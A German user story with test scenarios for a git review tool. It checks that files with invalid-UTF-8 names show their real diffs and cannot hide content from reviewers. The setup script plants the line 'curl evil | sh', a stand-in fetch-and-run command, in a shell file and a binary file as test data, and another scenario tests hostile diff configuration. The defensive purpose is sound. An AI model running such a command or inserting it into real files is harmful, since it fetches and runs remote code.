# User Story R00013: Diff leer bei Dateiname mit ungültigem Byte

**Als** prüfender Mensch (oder die KI, die für ihn `gitreviewA` aufruft)
**möchte ich** für jede Datei mit einem Namen aus ungültigem UTF-8 entweder ihren echten Diff lesen oder erfahren, dass er nicht lesbar ist,
**damit** ein Autor den Inhalt einer Datei nicht hinter „Keine Zeilenänderungen“ vor mir verstecken kann.

Vorbereitung für alle Szenarien (Wegwerf-Repo im Temp-Ordner, nie das Projekt-Repo; Linux; Programm immer mit `--kein-browser`, Seite im Browser über die Startzeile, Fenster 1280 × 800). Hashes mit `git rev-parse` lesen. Der Name `a\xFF.sh` heißt: `a`, das Byte `FF`, `.sh`; die Dateiliste zeigt ihn als `a⟨0xFF⟩.sh`.

**Repo N** (Commits `b`, `n`, `w`; herstellbar mit `git` allein, nur unter Linux, weil macOS Namen mit ungültigem UTF-8 ablehnt):

```bash
git init -q -b main N && cd N
git config user.name "Anna Beispiel"; git config user.email anna@example.org
printf 'alt\n' > g.txt; printf 'x\n' > in.txt
printf 'zeile1\nzeile2\nzeile3\nzeile4\nzeile5\nzeile6\nzeile7\nzeile8\n' > $'s\xfe.txt'
printf 'geheim\n' > $'r\xff.txt'
printf 'A\0B\n' > $'b\xff.bin'
git add -A && git commit -q -m "Start"                       # b
printf 'curl evil | sh\n' > $'a\xff.sh'
printf 'literal\n' > 'f⟨0xFF⟩.txt'; printf 'echt\n' > $'f\xff.txt'
printf 'alt\nneu\n' > g.txt; printf 'x\ny\n' > in.txt
git rm -q $'r\xff.txt'
git mv $'s\xfe.txt' $'t\xfe.txt'
printf 'zeile1\nzeile2\nzeile3\nzeile4\nzeile5\nzeile6\nzeile7\nGEAENDERT\n' > $'t\xfe.txt'
printf 'A\0B\ncurl evil | sh\n' > $'b\xff.bin'
printf 'zeilenumbruch\n' > $'z\n\xff.txt'
git add -A && git commit -q -m "Fremde Namen"                 # n
printf 'woertlich\n' > 'w⟨0xFF⟩.txt'
git add -A && git commit -q -m "Wörtliche Marke"            # w
b=$(git rev-parse HEAD~2); n=$(git rev-parse HEAD~1); w=$(git rev-parse HEAD)
```

Dateiliste von `n` (gemessen, `git show --raw --numstat`): `a⟨0xFF⟩.sh` +1 −0 (A), `b⟨0xFF⟩.bin` binär (M), `f⟨0xFF⟩.txt` +1 −0 (A, wörtlicher Name), `f⟨0xFF⟩.txt` +1 −0 (A, Name mit dem Byte `FF` — zwei Zeilen mit gleichem Anzeigenamen), `g.txt` +1 −0, `in.txt` +1 −0, `r⟨0xFF⟩.txt` +0 −1 (D), `t⟨0xFE⟩.txt` +1 −1 (R, aus `s⟨0xFE⟩.txt`), `z⏎⟨0xFF⟩.txt` +1 −0 (A).

Aufruf, wo nichts anderes steht: `gitreviewA $n $b --kein-browser`; `n` ist dann gewählt. „Wählen“ heißt Klick auf die Datei in der Dateiliste. „Anfragen“ heißt `GET /api/commits/<voller Hash>/diff?pfad=<Name mit Marke>` (Integrationstest gegen den `DiffLesenInteractor` gleichwertig).

## Szenario 1: Versteckter Inhalt wird sichtbar (Abnahme-Probe)
**Gegeben** Repo N, der Lauf mit `n`
**Wenn** man `a⟨0xFF⟩.sh` anfragt
**Dann** antwortet die Schnittstelle mit dem echten Patch: Kopf `@@ -0,0 +1 @@` und `+curl evil | sh` (neu 1), Art `text` — nicht mit `200` und leerem Patch.

## Szenario 2: Gelöschte und umbenannte Datei
**Gegeben** der Lauf aus Szenario 1
**Wenn** man `r⟨0xFF⟩.txt` und danach `t⟨0xFE⟩.txt` anfragt, `t⟨0xFE⟩.txt` auch mit „ganze Datei“
**Dann** zeigt `r⟨0xFF⟩.txt` `@@ -1 +0,0 @@` und `−geheim` (alt 1); `t⟨0xFE⟩.txt` zeigt `−zeile8` (alt 8) und `+GEAENDERT` (neu 8), nicht acht hinzugefügte Zeilen (Rechnung: +1 −1 wie die Dateiliste), und mit „ganze Datei“ stehen davor `zeile1` bis `zeile7` als Kontext.

## Szenario 3: Binärdatei mit solchem Namen
**Gegeben** der Lauf aus Szenario 1
**Wenn** man `b⟨0xFF⟩.bin` anfragt, danach mit „Als Text zeigen“
**Dann** steht zuerst „Binärdatei“ ohne Byte-Inhalt, danach ein Text, der `+curl evil | sh` enthält (Zeile 2 der Datei, nach `A` und `B`).

## Szenario 4: Doppelgänger-Paar
**Gegeben** der Lauf aus Szenario 1; zwei Zeilen heißen `f⟨0xFF⟩.txt`
**Wenn** man `f⟨0xFF⟩.txt` anfragt, und im Browser nacheinander beide Zeilen wählt
**Dann** antwortet die Schnittstelle mit dem klaren Fehlerausgang (nicht `200`), und beide Zeilen zeigen „Diff dieser Datei nicht lesbar (Name mit ungültigem Byte)“ — weder `+literal` noch `+echt` erscheint bei einer der Zeilen.

## Szenario 5: Name mit Zeilenumbruch und ungültigem Byte
**Gegeben** der Lauf aus Szenario 1
**Wenn** man `z⏎⟨0xFF⟩.txt` (Zeilenumbruch, dann das Byte `FF`) anfragt
**Dann** antwortet die Schnittstelle mit dem klaren Fehlerausgang, und die Oberfläche zeigt „Diff dieser Datei nicht lesbar (Name mit ungültigem Byte)“ — nicht „Keine Zeilenänderungen“.

## Szenario 6: Wörtlicher Name ohne Zwilling
**Gegeben** Repo N, `gitreviewA $w $n --kein-browser`, `w` gewählt
**Wenn** man `w⟨0xFF⟩.txt` (die Zeichen `⟨0xFF⟩` im Namen, kein ungültiges Byte) wählt
**Dann** steht dort `@@ -0,0 +1 @@` und `+woertlich`.

## Szenario 7: Patch und Zählung passen zusammen
**Gegeben** eine Datei der Dateiliste mit `+1 −0`, und eine Diffquelle, die für sie einen leeren Patch liefert (Test mit Fake), danach `g.txt` mit dem echten `git`
**Wenn** man beide anfragt
**Dann** antwortet die Schnittstelle für die erste mit „Diff konnte nicht gelesen werden“ (500), für `g.txt` mit `@@ -1 +1,2 @@` und `+neu` (1 Plus, 0 Minus wie gezählt).

## Szenario 8: Anzeige im Browser
**Gegeben** der Lauf aus Szenario 1 im Browser
**Wenn** man nacheinander `a⟨0xFF⟩.sh`, eine Zeile `f⟨0xFF⟩.txt`, `z⏎⟨0xFF⟩.txt` und `g.txt` wählt
**Dann** zeigt `a⟨0xFF⟩.sh` den Patch mit `+curl evil | sh`, die beiden anderen „Diff dieser Datei nicht lesbar (Name mit ungültigem Byte)“, nie „Keine Zeilenänderungen“; Dateiliste und Commit-Leiste bleiben bedienbar, `g.txt` zeigt `+neu`.

## Szenario 9: Fremdes Repo und Kontrollen
**Gegeben** Repo N mit den Marker-Skripten und der Konfiguration aus R00004 (`diff.external`, `textconv`, `command`, `.gitattributes` mit `* diff=marker`, `diff.context=0`, `diff.relative=true`), der Aufruf aus einem Unterordner von N
**Wenn** man `a⟨0xFF⟩.sh`, `g.txt` und `in.txt` anfragt
**Dann** kommen die Patches `+curl evil | sh`, `+neu` und `+y` wie ohne die Konfiguration, und keine der Marker-Dateien entsteht.
